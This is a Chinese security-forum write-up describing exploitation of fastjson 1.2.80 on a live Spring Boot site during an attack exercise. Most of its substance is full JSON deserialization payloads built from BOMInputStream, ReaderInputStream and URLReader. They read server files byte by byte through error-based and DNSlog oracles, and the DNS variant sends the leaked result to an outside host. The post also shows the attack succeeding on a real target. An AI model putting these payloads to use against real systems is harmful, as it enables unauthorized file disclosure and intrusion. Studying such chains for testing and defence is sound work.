---
title: fastjson1.2.80 in Springtboot实网利用记录
url: https://forum.butian.net/share/4427
source: 奇安信攻防社区
date: 2025-07-12
fetch_date: 2025-10-06T23:28:32.290822
---

# fastjson1.2.80 in Springtboot实网利用记录

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### fastjson1.2.80 in Springtboot实网利用记录

* [渗透测试](https://forum.butian.net/topic/47)

最近少有的一次顺利的RCE，虽有波折，但最终还是拿到了

前言
==
攻防碰到的一个站有fastjson，看着版本其实挺高的。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-5caeaf8d8914e788e6d4576e584025dd8b6f57c7.png)
这里存在一个问题，参照之前的文章，payload是需要有布尔部分的，或者说返回json的解析结果，但是此次是不存在布尔
添加缓存，爆破字节1-256无明显的差异，但是确实存在这个80的链，返回了报错是不存在的文件
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-679b6c0d2188357db167fc354fd7041d4911baa2.png)
1-256爆破
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-33924733cfd547e36edc84b82fcd42094f5d7e5e.png)
80error获取
=========
这是看到了之前大佬的一篇
<https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ>
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748221497688-c42491e6-3cbf-4437-8c87-adbcb0b1398f.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748221642964-fbf6ff27-41ce-45d2-8cc7-45bd79590457.png)
报错分析
----
文章中提到的报错payload如下：
```php
{
"abc":{"@type": "java.lang.AutoCloseable",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
"url": "file:///tmp/test"
},
"charsetName": "UTF-8",
"bufferSize": 1024
},"boms": [
{
"@type": "org.apache.commons.io.ByteOrderMark",
"charsetName": "UTF-8",
"bytes": [
98
]
}
]
},
"address" : {
"@type": "java.lang.AutoCloseable",
"@type":"org.apache.commons.io.input.CharSequenceReader",
"charSequence": {
"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"
},
"start": 0,
"end": 0
}
}
```
### $ref
<https://godownio.github.io/2024/10/24/fastjson-ref-diao-yong-getter/>
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748226968060-61c9b6bb-edd7-4430-9952-5c30817311e1.png)
这里代码对应的是CharSequenceReader(CharSequence charSequence, int start, int end)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748231229548-2a644ccd-cfc6-4f79-9416-ea0537d4d863.png)
这里是java.lang.CharSequence,而当字节存在时候，返回的是ByteOrderMark
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748231338215-74912995-47ac-4c44-9ace-7b0ec96d1436.png)
所以对象不匹配报错。
80payload
---------
这个payload是68的，我们根据80的规律改成80payload如下
```php
{
"a": {
"@type": "java.io.InputStream",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {
"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader": {
"@type": "jdk.nashorn.api.scripting.URLReader",
"url": "${file}"
},
"charsetName": "UTF-8",
"bufferSize": "1024"
},
"boms": [
{
"charsetName": "UTF-8",
"bytes": ${data}
}
]
},
"b" :{
"$ref":"$.a.BOM[0]"}
}
```
原始payload
---------
原始payload是需要返回json解析的
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748225807673-55b6b0c9-6d3a-44d8-b1e2-656e830fed7b.png)
针对实际情况，则无法获取到差异，取的是里面的BOMInputStream，所以不管是否比对成功，返回的都是BOMInputStream对象。
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748225868104-c22d0a86-bed4-4bf5-ae1c-1c074254f992.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748226169584-81fc24b3-654e-42e1-a2b0-994724184304.png)
改后的payload
----------
这里取的是BOMInputStream对象里面的BOM，getBOM()
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748226123204-2bf15d9f-a361-4788-bc6c-62fdfd0ee3a4.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748226298307-7795953c-d64e-4876-885b-8bc5b3446eac.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748227545340-14d566d6-cccb-4f6b-9070-a638030282f7.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748227555243-ddc99b67-3f3a-4ddb-8b64-027ce24735c1.png)
上图包中字节比对成功返回了ByteOrderMark对象，不成功返回的是null
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748229967650-5bbd7c23-2abe-47d8-9838-f5ef741a0925.png)
80error的寻找
----------
在68中，我们通过将ByteOrderMark赋值到CharSequenceReader导致对象不匹配报错，但是在80中我们只拿到了inputstream，我们无法使用CharSequenceReader，所以需要另外找一个触发报错的地方。
这里我们到回我们读字节的payload
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748231733159-0c3818f8-d04c-4f48-89d7-aa271468d954.png)
接收的是Reader对象
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748231762642-07234efe-d8d3-4290-a9ea-d8b842fda9fa.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748231794310-9f8d0184-c6a4-4e82-b4cf-c63ffaddf049.png)
这是个完美触发报错的地方，所以我们根据payload改成下面的
```php
{
"a": {
"@type": "java.io.InputStream",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {
"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader": {
"@type": "jdk.nashorn.api.scripting.URLReader",
"url": "${file}"
},
"charsetName": "UTF-8",
"bufferSize": "1024"
},
"boms": [
{
"charsetName": "UTF-8",
"bytes": ${data}
}
]
},
"b" :{
"@type": "java.io.InputStream",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {
"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader":{"$ref":"$.a.BOM[0]"},
"charsetName": "UTF-8",
"bufferSize": "1024"
},
"boms": [
{
"charsetName": "UTF-8",
"bytes": [97]
}
]
}
}
```
字节匹配没成功，返回的是BOMInputStream对象
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748231914658-23ac6321-db79-489e-bf1b-27590ff7dc5d.png)
当字节匹配成功时候，$.username.BOM\[0\]会调用到上面的username部分getBOM获取到ByteOrderMark并赋值给ReaderInputStream里面的reader导致对象类型不匹配报错
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748232018418-b08c56b5-25f3-4a02-8946-2f071d71d66b.png)
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748232065680-bb5b53a7-0bad-4c99-86f0-4f06fb1e0992.png)
实际环境的利用
-------
回到最初的问题，那个站是可以报错，所以我们使用这个payload尝试
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/06/attach-a38ffaf7984461e7273c3a3612f1c64d70edd32b.png)
114是r
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748233905486-c6711460-f176-4ad1-be0f-3e844e9d2e81.png)
80DNSlog
========
大佬文章同样提到了dns的方式
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748233971901-d00622f3-2cb2-41e5-b2df-aac74cedaf5a.png)
所以我们继续拼接
```php
{
"a": {
"@type": "java.io.InputStream",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {
"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader": {
"@type": "jdk.nashorn.api.scripting.URLReader",
"url": "${file}"
},
"charsetName": "UTF-8",
"bufferSize": "1024"
},
"boms": [
{
"charsetName": "UTF-8",
"bytes": ${data}
}
]
},
"b" :{
"@type": "java.io.InputStream",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {
"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader":{"$ref":"$.a.BOM[0]"},
"charsetName": "UTF-8",
"bufferSize": "1024"
},
"boms": [
{
"charsetName": "UTF-8",
"bytes": [1]
}
]
},
"c": {
"@type": "java.io.InputStream",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {
"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader": {
"@type": "jdk.nashorn.api.scripting.URLReader",
"url": "${dns}"
},
"charsetName": "UTF-8",
"bufferSize": "1024"
},
"boms": [
{
"charsetName": "UTF-8",
"bytes": [1]
}
]
},
"zzz":{"$ref":"$.c.BOM[0]"}
}
```
当字节不匹配的时候会进行dnslog请求，存在则不会
![](https://cdn.nlark.com/yuque/0/2025/png/22165379/1748234173042-139d29ad-c299-439f-8220-81e719e66653.png)
68读文件
=====
在大佬那篇文章都已经写出来了，所以在这里不看了，直接放payload
返回json读
-------
```php
{
"abc":{"@type": "java.lang.AutoCloseable",
"@type": "org.apache.commons.io.input.BOMInputStream",
"delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
"reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
"url": "file:///tmp/"
},
"charsetName": "UTF-8",
"...